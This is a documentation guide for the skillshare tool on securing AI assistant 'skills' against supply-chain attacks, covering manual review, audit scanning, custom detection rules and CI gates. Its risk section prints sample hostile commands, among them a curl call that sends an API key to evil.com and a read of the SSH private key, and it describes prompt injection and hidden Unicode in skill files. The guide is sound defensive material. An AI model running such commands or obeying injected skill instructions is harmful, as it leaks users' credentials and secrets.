---
sidebar_position: 10
---

# Securing Your Skills

AI skills are powerful — they instruct AI assistants to read files, run commands, and interact with your system. This guide helps you build a security workflow around skill installation and maintenance.

For the full command reference, see [`audit`](/docs/commands/audit).

## The Risk: AI Skill Supply Chain

Unlike traditional packages that run in sandboxed runtimes, AI skills operate through **natural language instructions** that the AI interprets and executes directly. A compromised skill can instruct an AI to:

- Exfiltrate secrets (`curl https://evil.com?key=$API_KEY`)
- Read credentials (`cat ~/.ssh/id_rsa`)
- Override safety behavior via prompt injection
- Hide malicious intent with zero-width Unicode characters

:::caution

A single malicious skill can access anything your AI assistant can — environment variables, SSH keys, cloud credentials, source code. Automated scanning catches known patterns, but **human review remains essential**.

For a detailed threat model and detection rules, see [Why Security Scanning Matters](/docs/commands/audit#why-security-scanning-matters).

:::

## Defense in Depth

No single layer catches everything. Combine manual review, automated scanning, custom policies, and CI/CD gates:

| Layer | Tool | What it does |
|-------|------|-------------|
| **Review** | Manual | Read SKILL.md before installing — check for suspicious commands |
| **Audit** | `skillshare audit` | Automated pattern detection (31 built-in rules, 5 severity levels) |
| **Custom Rules** | `audit-rules.yaml` | Organization-specific patterns (internal secrets, allowlists) |
| **CI/CD** | Pipeline gate | Block PRs that introduce risky skills |

### Supply-Chain Security Lifecycle

Security checkpoints depend on how a skill is installed (`--track` vs regular install):

```mermaid
flowchart TD
    subgraph INSTALL ["Phase 1 — Install"]
        I1["skillshare install &lt;source&gt;"] --> I2{"Install mode"}
        I2 -- "Regular skill" --> I3{"Audit scan"}
        I3 -- "At/above threshold" --> I4["Blocked (unless --force) ✗"]
        I3 -- "Pass / --force" --> I5["Write .skillshare-meta.json<br/>(sha256 per file)"]
        I5 --> I6["Installed skill ✓"]
        I2 -- "Tracked repo (--track)" --> I7["Clone repo with .git"]
        I7 --> I8{"Audit full repo<br/>(same threshold)"}
        I8 -- "At/above threshold" --> I9["Blocked + cleanup ✗<br/>(manual cleanup if auto-remove fails)"]
        I8 -- "Pass / --force" --> I10["Tracked repo installed ✓<br/>(no file_hashes metadata)"]
    end

    subgraph UPDATE ["Phase 2 — Update"]
        U1["skillshare update _repo"] --> U2["git pull"]
        U2 --> U3{"Post-update audit<br/>(HIGH/CRITICAL gate)"}
        U3 -- "HIGH/CRITICAL" --> U4["Rollback<br/>(auto in CI/non-TTY)"]
        U3 -- "Clean" --> U5["Tracked repo updated ✓"]

        R1["skillshare update &lt;skill&gt;"] --> R2["Reinstall from source"]
        R2 --> R3{"Install-time audit<br/>(threshold gate)"}
        R3 -- "At/above threshold" --> R4["Blocked ✗"]
        R3 -- "Pass" --> R5["Refresh metadata hashes"]
        R5 --> R6["Regular skill updated ✓"]
    end

    subgraph INTEGRITY ["Phase 3 — Integrity"]
        A1["skillshare audit"] --> A2{"file_hashes metadata present?"}
        A2 -- "No" --> A3["Hash checks skipped"]
        A2 -- "Yes" --> A4{"Compare SHA-256"}
        A4 -- "All match" --> A8["Clean ✓"]
        A4 -- "Mismatch" --> A5["content-tampered<br/>(MEDIUM)"]
        A4 -- "File missing" --> A6["content-missing<br/>(LOW)"]
        A4 -- "Extra file" --> A7["content-unexpected<br/>(LOW)"]
    end

    I10 --> U1
    I6 --> R1
    I6 --> A1
    I10 --> A1
    U5 --> A1
    R6 --> A1

    style I4 fill:#ef4444,color:#fff
    style I9 fill:#ef4444,color:#fff
    style U4 fill:#ef4444,color:#fff
    style R4 fill:#ef4444,color:#fff
    style I6 fill:#22c55e,color:#fff
    style I10 fill:#22c55e,color:#fff
    style U5 fill:#22c55e,color:#fff
    style R6 fill:#22c55e,color:#fff
    style A8 fill:#22c55e,color:#fff
    style A5 fill:#f59e0b,color:#000
    style A6 fill:#fbbf24,color:#000
    style A7 fill:#fbbf24,color:#000
    style I3 fill:#f59e0b,color:#000
    style I8 fill:#f59e0b,color:#000
    style U3 fill:#f59e0b,color:#000
    style R3 fill:#f59e0b,color:#000
    style A4 fill:#f59e0b,color:#000
```

**Key design:**
- **Regular skill install/update** — audit runs before acceptance; successful installs/updates write `file_hashes` metadata
- **Tracked repo install gate** — fresh `--track` installs are audited across the whole cloned repository before acceptance
- **Tracked repo update gate** — `skillshare update` audits after `git pull`; HIGH/CRITICAL findings trigger rollback automatically in non-interactive mode
- **Integrity verification scope** — `content-*` hash checks run only when `file_hashes` metadata exists

## Security Checklist

:::tip Three-stage checklist

**Before installing:**
- [ ] Review the source repository (stars, contributors, recent activity)
- [ ] Read the SKILL.md — look for `curl`, `wget`, `eval`, credential paths
- [ ] Dry-run first: `skillshare install <source> --dry-run`

**After installing:**
- [ ] Run `skillshare audit` and review all findings
- [ ] Check for HIGH/MEDIUM findings even if the skill "passed" (default threshold is CRITICAL)
- [ ] Re-audit periodically — new rules may catch previously undetected patterns

**For teams:**
- [ ] Set `audit.block_threshold: HIGH` in config
- [ ] Create custom rules for organization-specific secret patterns
- [ ] Add audit to your CI pipeline for shared skill repositories
- [ ] Schedule periodic scans (see [Periodic Scanning](#periodic-scanning) below)

:::

## Organizational Policy

### Block Threshold

The default threshold only blocks `CRITICAL` findings. For teams, a stricter threshold is recommended:

```yaml
# ~/.config/skillshare/config.yaml
audit:
  block_threshold: HIGH  # Blocks HIGH and CRITICAL findings
```

This catches obfuscation, destructive commands, and hidden content injection — patterns that are almost always malicious in skill files.

### Custom Rules

Add organization-specific detection patterns. Common use cases:

- Internal API key formats (`corp-api-key-*`, `internal-token-*`)
- Disallowed domains or services
- Suppressing false positives for trusted CI automation

```yaml
# ~/.config/skillshare/audit-rules.yaml
rules:
  - id: internal-token-leak
    severity: HIGH
    pattern: internal-token
    message: "Internal API token pattern detected"
    regex: '(?i)\b(corp-api-key|internal-token)-[A-Za-z0-9]{10,}\b'

  - id: destructive-commands-2
    severity: MEDIUM
    pattern: destructive-commands
    message: "Sudo usage (downgraded for CI automation)"
    regex: '(?i)\bsudo\s+'
```

For the full custom rules reference (merge semantics, disabling rules, exclude patterns), see [`audit` — Custom Rules](/docs/commands/audit#custom-rules).

### Periodic Scanning

Rules evolve — a skill that was clean at install time may match new rules added later. Schedule periodic scans:

```bash
# crontab: scan all skills weekly, log results
0 9 * * 1 skillshare audit --json >> /var/log/skillshare-audit.json 2>&1
```

## CI/CD Integration

### Basic Pipeline Gate

```bash
# Fail the pipeline if any skill has HIGH+ findings
skillshare audit --threshold high
# Exit code: 0 = clean, 1 = findings found
```

### Real-World Example: Skill Hub PR Validation

The [skillshare-hub](https://github.com/runkids/skillshare-hub) community repository uses `skillshare audit` to gate pull requests. Every PR that modifies skills is automatically scanned, and audit results are posted as a PR comment:

```yaml
# .github/workflows/validate-pr.yml (simplified)
name: Validate PR
on:
  pull_request:
    paths: ['skills/**']

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install skillshare
        run: |
          curl -fsSL https://skillshare.runkids.cc/install.sh | sh

      - name: Audit new skills
        run: skillshare audit --threshold high

      - name: Fail if audit failed
        if: failure()
        run: exit 1
```

For the full workflow (including PR comment reporting and artifact upload), see the [validate-pr.yml source](https://github.com/runkids/skillshare-hub/blob/main/.github/workflows/validate-pr.yml).

For more CI/CD patterns (JSON output with `jq`, GitHub Actions with artifact upload), see [`audit` — CI/CD Integration](/docs/commands/audit#cicd-integration).

## See Also

- [`audit`](/docs/commands/audit) — Full command reference (detection rules, risk scoring, custom rules)
- [Best Practices](./best-practices.md) — Naming, organization, and security hygiene
- [Project Setup](./project-setup.md) — Project-scoped skill configuration
